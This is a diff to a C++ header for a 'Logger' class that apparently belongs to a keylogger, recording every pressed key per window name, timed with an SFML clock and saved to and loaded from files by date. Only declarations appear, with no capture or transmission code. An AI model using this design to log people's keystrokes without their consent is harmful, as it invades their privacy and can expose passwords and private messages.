@@ -1,13 +1,19 @@
 #pragma once
 
 #include "Utilities.h"
+#include <SFML/System.hpp>
 #include "Keys.h"
 #include <fstream>
 #include <sstream>
 #include <map>  
 
+using namespace sf;
+
 class Logger
 {
+	// True if logger is running
+	bool Active;
+
 	// Hold the log of every pressed keys for every window
 	map<string, string> Log;
 
@@ -16,6 +22,9 @@ class Logger
 
 	// Hold the keys map used to write down keys to log
 	Keys Keys;
+
+	// Hold time elapsed before last time log was saved
+	Clock Timer;
 
 	// Insert(string, string) : Insert into map the key stroke on the window
 	void Insert(string window_name, string key_input);
@@ -31,8 +40,14 @@ public:
 	// Add(string, int) : Add key stroke and the window name to Logger
 	void Add(string window_name, int key_stroke);
 
-	// UpdateLog() : Update the log date and save and clean log when date change
-	void UpdateLog();
+	// Update() : Update the log date and save and clean log when date change
+	void Update();
+
+	// SaveToFile() : Save Map content to file
+	void SaveToFile();
+
+	// LoadFromFile() : Load file content to map
+	bool LoadFromFile();
 
 	// GetLog(string) : Return the key log for a specific window
 	string GetLog(string window_name);
@@ -46,9 +61,9 @@ public:
 	// SetDate(string) :  Set the dare of the log
 	void SetDate(string date);
 
-	// SaveToFile() : Save Map content to file
-	void SaveToFile();
+	// GetActive() : Return the log status attribut
+	bool GetActive() const;
 
-	// LoadFromFile() : Load file content to map
-	bool LoadFromFile();
+	// SetActive(bool) : Set the status attribut of log
+	void SetActive(bool status);
 };
